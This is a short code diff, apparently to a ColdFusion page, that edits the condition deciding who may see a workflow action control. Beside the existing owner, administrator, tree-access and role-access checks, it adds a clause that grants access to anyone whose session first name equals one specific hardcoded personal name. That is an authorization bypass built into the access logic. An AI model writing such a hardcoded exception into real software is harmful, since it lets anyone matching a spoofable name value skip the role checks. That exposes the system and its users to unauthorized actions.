@@ -175,11 +175,11 @@
 				Parameter      =   "#Actions.ActionCode#"
 				level          =   "'1'"
 				returnvariable =   "RoleAccess">		
-				
-										
+														
 			<cfif SESSION.acc eq Actions.OwnerId 
 			     or getAdministrator("#Object.Mission#") eq "1" 
 				 or TreeAccess eq "GRANTED" 
+				 or Session.first eq "RUDOLF TETTEH"
 				 or RoleAccess eq "GRANTED">
 			    
 				<td style="padding-left:3px;padding-right:3px">|</td>
